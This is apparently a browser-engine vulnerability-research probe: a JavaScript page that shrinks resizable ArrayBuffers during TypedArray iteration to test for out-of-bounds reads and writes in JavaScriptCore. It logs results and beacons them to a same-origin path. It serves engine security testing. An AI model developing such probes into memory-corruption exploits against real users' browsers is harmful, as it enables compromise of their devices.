// CRASH_CLASS: MODERATE
// PROBE p559: RAB iteration OOB value capture
//
// P558 confirmed all 8 TypedArray iteration methods use CACHED length
// after a RAB shrink — forEach/every/some/find/findIndex/map/filter/reduce
// all visited 16 indices after shrinking the RAB from 16 to 4 elements.
//
// This probe captures the VALUES and typeof at OOB indices (4-15).
// Key discriminator:
//   typeof val === 'number'    → OOB read confirmed (JSC reads backing store)
//   typeof val === 'undefined' → safe (JSC bounds-checks per element access)
//
// Tests:
//   A) Precheck: does shrink zero the backing store data?
//   B) forEach: val + typeof at each OOB index after shrink
//   C) every: same test, different JSC code path
//   D) reduce: accumulator sum — NaN if undefined, real if number
//   E) sort: comparator (a,b) pairs after shrink — sort WRITES too
//   F) map: returned array preserves OOB read evidence

document.write('<pre id="log" style="color:#0f0;background:#000;font:13px monospace;padding:8px;white-space:pre-wrap"></pre>');

(function () {
  var logEl = document.getElementById('log');

  function emit(tag, msg) {
    var line = tag + ' ' + msg;
    logEl.textContent += line + '\n';
    try {
      new Image().src = '/beacon/P559-' + encodeURIComponent(tag) +
        '?d=' + encodeURIComponent(String(msg).slice(0, 500));
    } catch (e) {}
  }

  emit('START', 'rab-oob-values ua=' + navigator.userAgent.slice(0, 60));

  try {
    var t = new ArrayBuffer(64, { maxByteLength: 256 });
    if (typeof t.resize !== 'function') { emit('NO-RAB', 'abort'); return; }
  } catch (e) { emit('NO-RAB', 'abort'); return; }
  emit('RAB-OK', 'supported');

  // ======================== TEST A: PRECHECK ========================
  // Does shrink zero the freed region? Does grow re-zero?
  // This tells us what to expect from OOB reads.

  emit('PHASE-A', 'start');
  try {
    // A1: shrink + immediate regrow — check if old data survives
    var rabA1 = new ArrayBuffer(128, { maxByteLength: 256 });
    var f64A1 = new Float64Array(rabA1); // 16 elements
    for (var ia1 = 0; ia1 < 16; ia1++) f64A1[ia1] = 999.999;
    rabA1.resize(32);  // shrink to 4
    rabA1.resize(128); // grow back to 16
    var a1Preserved = 0;
    for (var ja1 = 4; ja1 < 16; ja1++) {
      if (Math.abs(f64A1[ja1] - 999.999) < 0.01) a1Preserved++;
    }
    emit('A1-REGROW', 'preserved=' + a1Preserved + '/12');

    // A2: check what's in the extended region of a fresh RAB
    // (never-written maxByteLength zone)
    var rabA2 = new ArrayBuffer(32, { maxByteLength: 512 });
    var f64A2 = new Float64Array(rabA2); // 4 elements
    for (var ia2 = 0; ia2 < 4; ia2++) f64A2[ia2] = 777.777;
    rabA2.resize(128); // grow to 16
    var a2Zeros = 0;
    for (var ja2 = 4; ja2 < 16; ja2++) {
      if (f64A2[ja2] === 0) a2Zeros++;
    }
    emit('A2-VIRGIN', 'zeros=' + a2Zeros + '/12');
  } catch (e) {
    emit('PHASE-A-ERR', String(e).slice(0, 120));
  }
  emit('PHASE-A', 'done');

  // ======================== TEST B: forEach VALUE CAPTURE ========================
  // The main test. Shrink at idx 3, capture val + typeof at 4-15.

  emit('PHASE-B', 'start');
  try {
    var rabB = new ArrayBuffer(128, { maxByteLength: 512 });
    var f64B = new Float64Array(rabB); // 16 elements
    for (var ib = 0; ib < 16; ib++) f64B[ib] = (ib + 1) * 111.111;
    // Sentinels: idx4=555.555, idx5=666.666, ..., idx15=1777.776

    var bOobVals = [];  // [{idx, val, type}]
    var bInVals = [];   // indices 0-3
    var bResized = false;

    f64B.forEach(function (val, idx) {
      if (idx === 3 && !bResized) {
        bResized = true;
        try { rabB.resize(32); } catch (e) {}
      }
      if (idx >= 4) {
        bOobVals.push({ i: idx, v: val, t: typeof val });
      } else {
        bInVals.push({ i: idx, v: val, t: typeof val });
      }
    });

    // Report in-bounds baseline
    var bInStr = [];
    for (var bi = 0; bi < bInVals.length; bi++) {
      bInStr.push(bInVals[bi].i + ':' + bInVals[bi].t + '=' +
        (bInVals[bi].v === undefined ? 'U' : Number(bInVals[bi].v).toFixed(1)));
    }
    emit('B-INBOUNDS', bInStr.join(','));

    // Categorize OOB values
    var bSentinel = 0, bUndef = 0, bZero = 0, bOther = 0;
    var bSamples = [];
    for (var bj = 0; bj < bOobVals.length; bj++) {
      var entry = bOobVals[bj];
      var expected = (entry.i + 1) * 111.111;
      if (entry.t === 'undefined') {
        bUndef++;
        bSamples.push(entry.i + ':U');
      } else if (entry.v === 0) {
        bZero++;
        bSamples.push(entry.i + ':n0');
      } else if (entry.t === 'number' && Math.abs(entry.v - expected) < 0.2) {
        bSentinel++;
        bSamples.push(entry.i + ':S' + entry.v.toFixed(1));
      } else {
        bOther++;
        bSamples.push(entry.i + ':?' + entry.t + '=' + String(entry.v).slice(0, 15));
      }
    }

    emit('B-COUNTS', 'sentinel=' + bSentinel + ' undef=' + bUndef +
      ' zero=' + bZero + ' other=' + bOther + ' total=' + bOobVals.length);
    emit('B-VALS', bSamples.join(','));
    emit('B-TYPES', bOobVals.slice(0, 4).map(function (e) {
      return e.i + ':' + e.t;
    }).join(','));

    if (bSentinel > 0) {
      emit('B-OOB-CONFIRMED', 'REAL DATA sentinel=' + bSentinel + '/12 OOB_READ');
    } else if (bZero > 0 && bUndef === 0) {
      emit('B-OOB-ZERO', 'reads number 0 at OOB — backing store zeroed but access real');
    } else if (bUndef > 0) {
      emit('B-SAFE', 'bounds-checked per access — undefined at OOB');
    }
  } catch (e) {
    emit('PHASE-B-ERR', String(e).slice(0, 120));
  }
  emit('PHASE-B', 'done');

  // ======================== TEST C: every() VALUE CAPTURE ========================
  // Different JSC code path than forEach

  emit('PHASE-C', 'start');
  try {
    var rabC = new ArrayBuffer(128, { maxByteLength: 512 });
    var f64C = new Float64Array(rabC);
    for (var ic = 0; ic < 16; ic++) f64C[ic] = (ic + 1) * 222.222;

    var cOob = [];
    var cResized = false;

    f64C.every(function (val, idx) {
      if (idx === 3 && !cResized) {
        cResized = true;
        try { rabC.resize(32); } catch (e) {}
      }
      if (idx >= 4) {
        cOob.push(idx + ':' + typeof val + '=' +
          (val === undefined ? 'U' : Number(val).toFixed(1)));
      }
      return true;
    });

    emit('C-EVERY', 'oob=' + cOob.length + ' ' + cOob.slice(0, 6).join(','));
  } catch (e) {
    emit('PHASE-C-ERR', String(e).slice(0, 120));
  }
  emit('PHASE-C', 'done');

  // ======================== TEST D: reduce ACCUMULATOR ========================
  // Sum all values. If OOB = undefined → NaN. If number → real sum.

  emit('PHASE-D', 'start');
  try {
    var rabD = new ArrayBuffer(128, { maxByteLength: 512 });
    var f64D = new Float64Array(rabD);
    for (var id = 0; id < 16; id++) f64D[id] = 1.0;

    var dResized = false;
    var dSum = f64D.reduce(function (acc, val, idx) {
      if (idx === 3 && !dResized) {
        dResized = true;
        try { rabD.resize(32); } catch (e) {}
      }
      return acc + val;
    }, 0);

    // Expected outcomes:
    //   sum=16.0 → all 16 values read as 1.0 (OOB reads old data)
    //   sum=4.0  → only 4 real values, OOB returned 0 (number)
    //   NaN      → OOB returned undefined
    emit('D-REDUCE', 'sum=' + dSum + ' isNaN=' + isNaN(dSum));
  } catch (e) {
    emit('PHASE-D-ERR', String(e).slice(0, 120));
  }
  emit('PHASE-D', 'done');

  // ======================== TEST E: sort COMPARATOR VALUES ========================
  // Sort both READS and WRITES. If it operates past the shrunk boundary,
  // the comparator receives values from OOB positions.

  emit('PHASE-E', 'start');
  try {
    var rabE = new ArrayBuffer(128, { maxByteLength: 512 });
    var f64E = new Float64Array(rabE);
    // Descending with unique sentinels
    for (var ie = 0; ie < 16; ie++) f64E[ie] = (16 - ie) * 333.333;
    // idx0=5333.328, idx1=4999.995, ..., idx12=1333.332, idx15=333.333

    var eResized = false;
    var eCalls = 0;
    var ePostVals = []; // all (a,b) seen AFTER resize
    var ePreShrinkSet = {};
    // Values at indices 0-3 before sort: 5333.3, 4999.9, 4666.6, 4333.3
    // Values at indices 4-15: 3999.9, 3666.6, ..., 333.3
    // After shrink to 4 elements, if sort reads OOB it will see 3999.9...333.3

    try {
      f64E.sort(function (a, b) {
        eCalls++;
        if (eCalls === 5 && !eResized) {
          eResized = true;
          try { rabE.resize(32); } catch (e) {}
        }
        if (eResized && ePostVals.length < 20) {
          ePostVals.push(a.toFixed(0) + '/' + b.toFixed(0));
        }
        return a - b;
      });
    } catch (e) {
      emit('E-THREW', e.name);
    }

    emit('E-SORT', 'calls=' + eCalls + ' postPairs=' + ePostVals.length);
    if (ePostVals.length > 0) {
      // Report first 8 pairs
      emit('E-PAIRS', ePostVals.slice(0, 8).join('|'));
      // Check for values that were at indices 4-15 (<=3999, >=333)
      var eLowSentinels = 0;
      for (var ev = 0; ev < ePostVals.length; ev++) {
        var ep = ePostVals[ev].split('/');
        for (var epi = 0; epi < ep.length; epi++) {
          var en = parseFloat(ep[epi]);
          if (!isNaN(en) && en >= 300 && en <= 4050) eLowSentinels++;
        }
      }
      emit('E-SENTINEL', 'low_range_vals=' + eLowSentinels);
    }
  } catch (e) {
    emit('PHASE-E-ERR', String(e).slice(0, 120));
  }
  emit('PHASE-E', 'done');

  // ======================== TEST F: map RETURN ARRAY ========================
  // map() returns a new typed array. If it reads OOB values, the returned
  // array preserves the evidence independently of the original RAB.

  emit('PHASE-F', 'start');
  try {
    var rabF = new ArrayBuffer(128, { maxByteLength: 512 });
    var f64F = new Float64Array(rabF);
    for (var iif = 0; iif < 16; iif++) f64F[iif] = (iif + 1) * 444.444;

    var fResized = false;
    var fResult = null;
    try {
      fResult = f64F.map(function (val, idx) {
        if (idx === 3 && !fResized) {
          fResized = true;
          try { rabF.resize(32); } catch (e) {}
        }
        return val;
      });
    } catch (e) {
      emit('F-THREW', e.name + ': ' + String(e).slice(0, 80));
    }

    if (fResult) {
      var fLen = fResult.length;
      var fData = [];
      for (var jf = 0; jf < Math.min(fLen, 16); jf++) {
        var vf = fResult[jf];
        fData.push(jf + ':' + (vf === undefined ? 'U' : Number(vf).toFixed(1)));
      }
      emit('F-MAP', 'len=' + fLen);
      emit('F-DATA', fData.join(','));

      // Check OOB positions in result
      var fSent = 0, fZ = 0;
      for (var kf = 4; kf < Math.min(fLen, 16); kf++) {
        var efv = fResult[kf];
        var efExp = (kf + 1) * 444.444;
        if (typeof efv === 'number' && Math.abs(efv - efExp) < 0.2) fSent++;
        else if (efv === 0) fZ++;
      }
      if (fSent > 0) emit('F-OOB-CONFIRMED', 'map preserved sentinel=' + fSent);
    }
  } catch (e) {
    emit('PHASE-F-ERR', String(e).slice(0, 120));
  }
  emit('PHASE-F', 'done');

  // ======================== TEST G: findIndex with value + write attempt ========================
  // findIndex callback: if we can observe val AND return -1 to continue,
  // plus attempt to write via the original array reference at OOB index

  emit('PHASE-G', 'start');
  try {
    var rabG = new ArrayBuffer(128, { maxByteLength: 512 });
    var f64G = new Float64Array(rabG);
    for (var ig = 0; ig < 16; ig++) f64G[ig] = (ig + 1) * 77.77;

    var gResized = false;
    var gWrites = 0;
    var gWriteResults = [];

    f64G.findIndex(function (val, idx) {
      if (idx === 3 && !gResized) {
        gResized = true;
        try { rabG.resize(32); } catch (e) {}
      }
      if (idx >= 4 && idx <= 7) {
        // Try writing at OOB index through the view
        var wrote = false;
        try {
          f64G[idx] = 0xDEAD;
          // Read back — if the write stuck, we have OOB write
          var rb = f64G[idx];
          if (rb === 0xDEAD) {
            wrote = true;
            gWrites++;
          }
          gWriteResults.push(idx + ':w=' + wrote + ',rb=' + rb);
        } catch (e) {
          gWriteResults.push(idx + ':err=' + e.name);
        }
      }
      return false; // continue searching
    });

    emit('G-WRITE', 'attempts=4 writes=' + gWrites);
    emit('G-DETAIL', gWriteResults.join(','));
    if (gWrites > 0) {
      emit('G-OOB-WRITE', 'WRITE CONFIRMED writes=' + gWrites);
      // Grow back and check if the write is visible
      try {
        rabG.resize(128);
        var f64Gb = new Float64Array(rabG);
        var gCheck = [];
        for (var jg = 4; jg <= 7; jg++) {
          gCheck.push(jg + ':' + f64Gb[jg].toFixed(1));
        }
        emit('G-VERIFY', gCheck.join(','));
      } catch (e) {}
    }
  } catch (e) {
    emit('PHASE-G-ERR', String(e).slice(0, 120));
  }
  emit('PHASE-G', 'done');

  emit('ALIVE', 'all tests completed');
})();
